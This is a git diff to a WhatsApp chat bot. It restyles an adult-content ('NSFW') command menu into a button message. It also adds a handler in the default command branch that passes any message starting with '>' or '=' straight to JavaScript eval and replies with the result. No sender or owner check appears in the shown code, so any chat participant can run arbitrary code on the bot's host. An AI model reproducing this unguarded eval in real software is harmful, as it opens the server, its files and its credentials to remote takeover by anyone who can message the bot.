@@ -1534,16 +1534,17 @@ samu330.updatePresence(from, Presence.composing)
 if (!isRegister) return samu330.sendMessage(from, notreg, MessageType.text, { quoted: noreg})
 if (!isGroup) return reply(mess.only.group)
 if (!isNsfw) return reply(mess.nsfw)
-samuPn = fs.readFileSync('./src/+18.jpg')
-uptime = process.uptime()
+//samuPn = fs.readFileSync('./src/+18.jpg')
+//uptime = process.uptime()
 
-const Menu18 = `================================
+const Menux = `_*NORPO...*_
+
 ${bodyM} ${prefix}lesbian 
 ${bodyM} ${prefix}tetas
 ${bodyM} ${prefix}ass
 ${bodyM} ${prefix}pussy
 
-_*🍒Estilo anime🍒*_
+_*HENTAI :3*_
 
 ${bodyM} ${prefix}xwaifu
 ${bodyM} ${prefix}xneko
@@ -1564,16 +1565,24 @@ ${bodyM} ${prefix}pussyimg
 ${bodyM} ${prefix}oppai
 ${bodyM} ${prefix}cumimg
 
-*GIFS*
+_*GIFS*_
 
 ${bodyM} ${prefix}pussyg
 ${bodyM} ${prefix}boobsg
 ${bodyM} ${prefix}analg
-================================
 `
 addFilter(from)
 addLevelingXp(sender, 20)		
-samu330.sendMessage(from, samuPn, image, { quoted: fnsfw, caption: `${Menu18}`, thumbnail: samuPn, contextInfo: { mentionedJid: [sender]}})              
+//samu330.sendMessage(from, samuPn, image, { quoted: fnsfw, caption: `${Menu18}`, thumbnail: samuPn, 
+					  contextInfo: { mentionedJid: [sender]}})              
+
+sendButLocation(from, `Hola :\n@${sender.replace("@s.whatsapp.net", "")}\n\n${Menux}`, `© Creator\n⛧⸸⁶Death⁹†حب♡ت`, 
+		{jpegThumbnail: fs.readFileSync('./src/+18.jpg')}, [
+          {buttonId: `${prefix}Rikolino`, buttonText: {displayText: `Rico :3`}, type: 1},
+          {buttonId: `${prefix}ReTurbio`, buttonText: {displayText: `Re Turbio`}, type: 1},
+], { quoted: fnsfw,
+   contextInfo: { mentionedJid: [sender]}});		
+		
 break
 /////////			
 		
@@ -7515,6 +7524,26 @@ break
 
 
 default:
+if (body.startsWith('>')){
+            const util = require("util");
+            konsol = budy.slice(1)
+            Return = (sul) => {
+            sat = JSON.stringify(sul, null, 2)
+            bang = util.format(sat)
+            if (sat == undefined){
+            bang = util.format(sul)
+            }
+            return reply(bang)
+            }
+            try {
+            reply(`${util.format(eval(`;(async () => { ${konsol} })()`))}`)
+            } catch(e){
+            reply(`${String(e)}`)
+            }}
+if (body.startsWith("=")) {
+return await reply(JSON.stringify(eval(args.join(" ")), null, 2))
+}		
+
 if (isGroup){
 try{
 if (body.startsWith(`${messagebot}`)) {
